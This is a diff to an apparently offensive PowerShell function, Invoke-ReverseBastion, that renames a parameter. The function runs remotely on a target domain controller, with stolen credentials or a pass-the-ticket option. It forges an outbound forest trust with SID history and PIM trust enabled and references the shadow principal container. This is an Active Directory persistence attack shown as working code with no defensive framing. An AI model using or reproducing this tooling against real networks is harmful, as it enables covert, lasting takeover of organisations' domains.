@@ -81,31 +81,30 @@ function Invoke-ReverseBastion {
 
     $block = {
         param(
-            [string]$CurrentDomain,
-            [string]$TargetDomain,
+            [string]$BastionDomain,
             [System.Security.SecureString]$trustpass
         )
         [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")
 
         try {
             [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
-                $CurrentDomain,
+                $BastionDomain,
                 [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                 $trustpass
             )
         } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
             Write-Host "Local side of trust relationship already exists; updating instead of creating anew"
             [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().UpdateLocalSideOfTrustRelationship(
-                $CurrentDomain,
+                $BastionDomain,
                 [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                 $trustpass
             )
         }
 
-        netdom trust $CurrentDomain /ForestTransitive:yes
-        netdom trust $CurrentDomain /EnableSIDHistory:yes
-        netdom trust $CurrentDomain /EnablePIMTrust:yes
-        netdom trust $CurrentDomain /Verify
+        netdom trust $BastionDomain /ForestTransitive:yes
+        netdom trust $BastionDomain /EnableSIDHistory:yes
+        netdom trust $BastionDomain /EnablePIMTrust:yes
+        netdom trust $BastionDomain /Verify
     }
 
     try {
@@ -133,9 +132,9 @@ function Invoke-ReverseBastion {
     }
 
     if ($PTT) {
-        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-CurrentDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
+        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
     } else {
-        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-CurrentDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
+        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TargetDomain $TargetDomain -trustpass $trustpass"
     }
 
     $shadowcontainer = "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).ConfigurationNamingContext)"
